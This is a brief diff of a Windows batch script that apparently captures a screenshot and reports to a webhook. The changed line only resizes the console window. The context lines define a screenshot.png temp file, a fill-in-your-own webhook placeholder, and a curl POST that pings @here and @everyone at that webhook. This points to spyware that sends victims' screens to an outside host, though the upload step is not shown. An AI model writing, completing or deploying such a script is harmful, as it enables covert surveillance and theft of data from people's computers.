@@ -1,5 +1,5 @@
 @echo off
-mode con: cols=15 lines=10
+mode con: cols=25 lines=15
 set "tempfile=%~dp0screenshot.png"
 set webhook=*ur webhook here*
 curl -X POST -d "content=||@here||||@everyone||" %webhook%
